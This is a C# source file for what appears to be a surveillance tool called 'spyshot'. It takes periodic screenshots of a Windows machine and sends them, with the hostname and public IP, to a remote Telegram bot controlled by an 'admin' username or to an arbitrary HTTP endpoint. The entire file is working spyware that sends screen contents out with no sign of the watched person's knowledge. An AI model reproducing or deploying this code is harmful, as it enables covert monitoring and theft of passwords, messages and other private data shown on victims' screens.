using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Timers;
using spyshot;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;


internal class Program
{
    static ITelegramBotClient botClient;
    static long? chatId = default;
    private static void Main(string[] args)
    {
        // args = new string[] { "--bot-token=<>", "--admin-username=<>" };
#if WINDOWS

        var input = GetInputFromArgs(args);

        ConfigureBot(input.BotToken, input.AdminUsername);
    
        Timer timer = new() { Interval = input.Interval };
        timer.Elapsed += async (a, b) => await Task.Run(async () => 
        {
            if(NetworkInterface.GetIsNetworkAvailable() is false)
            {
                Console.WriteLine("We dont have connection, skipping for next round...");
            }
            else
            {
                try 
                {
                    byte[] imageBytes = Screen.GetScreenshot();

                    if(false == string.IsNullOrWhiteSpace(input.Destination))
                        await SendToDriveAsync(input.Destination, imageBytes);

                    if(false == string.IsNullOrWhiteSpace(input.BotToken))
                        await SendToBotAsync(imageBytes);
                    
                }
                catch(Exception ex)
                {
                    Console.WriteLine($"Error: {JsonSerializer.Serialize(ex)}");
                }
            }
        });

        timer.Start();

        while(true);
#endif
    }

    private static async Task SendToBotAsync(byte[] imageBytes)
    {
        if(chatId.HasValue)
        {
            using var stream = new MemoryStream(imageBytes);
            await botClient.SendPhotoAsync(
                chatId:chatId,
                photo: InputFile.FromStream(stream),
                caption: Dns.GetHostName());
        }
        else 
        {
            Console.WriteLine("Admin should write to bot first in order to create a chatrooom.");
        }
    }

    private static async Task SendToDriveAsync(string destination, byte[] imageBytes)
    {
        var base64Image = Convert.ToBase64String(imageBytes);
        string hostName = Dns.GetHostName();

        var payload = new StringContent(JsonSerializer.Serialize(new
        {
            image = base64Image,
            hostName,
            ip = await GetIpOrDefaultAsync()
        }));
        
        using var client = new HttpClient();
        byte[] payloadBytes = Encoding.UTF8.GetBytes(base64Image);
        HttpResponseMessage response = await client.PostAsync(destination, payload);
        Console.WriteLine($"Response: {response.StatusCode}, {await response.Content.ReadAsStringAsync()}");
    }

    private static void ConfigureBot(string botToken, string adminUsername)
    {
        if(!string.IsNullOrWhiteSpace(botToken))
        {
            botClient = new TelegramBotClient(botToken);

            botClient.StartReceiving(
                async (client, update, token) => 
                {
                    if(update.Type == UpdateType.Message)
                    {
                        var username = update.Message.From.Username;
                        var adminChatId = update.Message.Chat.Id;

                        if(string.Equals(adminUsername, username, StringComparison.InvariantCultureIgnoreCase))
                        {
                            chatId = adminChatId;
                            await client.SendTextMessageAsync(
                                adminChatId,
                                "Sizni ro'yxatga oldik, boss 🫡",
                                cancellationToken: token);
                        }
                        else 
                        {
                            await client.SendTextMessageAsync(
                                adminChatId,
                                "NO ✋",
                                cancellationToken: token);
                        }
                    }
                },
                (client, exception, token) =>
                {
                    Console.WriteLine(exception.Message);
                },
                new()
                {
                    AllowedUpdates = new UpdateType[] { UpdateType.Message }
                });
        }

        
    }   

    static (int Interval, string Destination, string BotToken, string AdminUsername) GetInputFromArgs(string[] args)
    {
        var destinationUrl = args.FirstOrDefault(a => a.StartsWith("--destination="));

        var intervalString = args.FirstOrDefault(a => a.StartsWith("--interval="));
        int.TryParse(intervalString?.Replace("--interval=", "") ?? "10", out int interval);

        var botToken = args.FirstOrDefault(a => a.StartsWith("--bot-token="));
        var adminUsername = args.FirstOrDefault(a => a.StartsWith("--admin-username="));

        if(string.IsNullOrWhiteSpace(destinationUrl) && string.IsNullOrWhiteSpace(botToken))
            throw new Exception("You must specify either --destination= or --bot-token=");

        if(!string.IsNullOrWhiteSpace(botToken) && string.IsNullOrWhiteSpace(adminUsername))
            throw new Exception("You must specify --admin-username= when you specify --bot-token=");

        return (
            interval > 0 ? interval * 1000 : 3600 * 1000, 
            destinationUrl?.Replace("--destination=", ""), 
            botToken?.Replace("--bot-token=", ""),
            adminUsername?.Replace("--admin-username=", "")
        );
    }

    static async Task<string> GetIpOrDefaultAsync()
    {
        var ipResponse = await new HttpClient().GetStringAsync("http://ipinfo.io/ip");
        
        if(IPAddress.TryParse(ipResponse, out IPAddress ip))
            return ip.ToString();

        return default;
    }
}
